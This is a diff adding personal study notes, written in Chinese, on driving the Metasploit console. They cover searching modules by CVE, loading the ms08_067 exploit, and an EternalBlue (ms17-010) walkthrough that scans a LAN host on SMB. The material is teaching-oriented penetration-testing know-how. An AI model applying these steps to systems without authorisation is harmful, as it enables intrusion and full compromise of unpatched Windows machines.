@@ -117,6 +117,139 @@ msf6 > search type:exploit platform:mysql
 msf6 > search type:auxiliary platform:mysql
 #platform可能搜不到，换name
 
+MySQL yaSSL CertDecoder::GetName Buffer Overflow
+缓冲区溢出漏洞
+
+6.根据cve搜索exploit
+CVE 公共漏洞和暴露；广泛暴露的弱点
+查找CVE-2017-8464远程命令执行漏洞
+
+msf6 > search cve:CVE-2017-8464
+
+msf6 > search Disclosure Date:2018 platform:linux
+
+###########use使用方法
+use 模块名
+ms08_067  winxp漏洞
+msf6 > search ms08_067
+直接搜索，不用加name:
+
+装载渗透攻击模块
+msf6 > use exploit/windows/smb/ms08_067_netapi
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms08_067_netapi) > 
+装载成功
+
+退出
+msf6 exploit(windows/smb/ms08_067_netapi) > back
+msf6 > 
+不要输入exit
+
+info
+查看模块是干嘛的
+msf6 > info exploit/windows/smb/ms08_067_netapi
+
+msf6 exploit(windows/smb/ms08_067_netapi) >info
+进入后info也可以
+
+
+##################——————》实例，永恒之蓝
+win的SMB漏洞，攻击445，获取主机最高权限；开机上网就能用
+
+ms17-010 漏洞
+
+整体使用流程：
+查找模块
+  search
+配置程序
+  显示参数
+    show option
+    show target
+    show encoders
+    show advanced
+  设置参数
+    use XXX （exploit）
+    set XXX（利用show options）（payload）
+    set XXX XXX（参数）
+exploit
+  执行
+  exploit（命令）
+  run
+
+
+整体使用流程：
+查找模块
+  search
+    msf6 > search ms17-010
+配置程序
+  显示参数
+    show option
+    show target
+    show encoders
+    show advanced
+  设置参数
+    use XXX （exploit）
+      msf6 > use auxiliary/scanner/smb/smb_ms17_010
+      先使用scan扫描模块检查是否能用，再攻击
+      msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+    set XXX（利用show option）（payload）
+      msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.56
+      RHOSTS => 192.168.1.56
+      msf6 auxiliary(scanner/smb/smb_ms17_010) > show options      
+    set XXX XXX（参数）
+exploit
+  执行
+  exploit（命令）
+  run
+    msf6 auxiliary(scanner/smb/smb_ms17_010) >run
+    
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
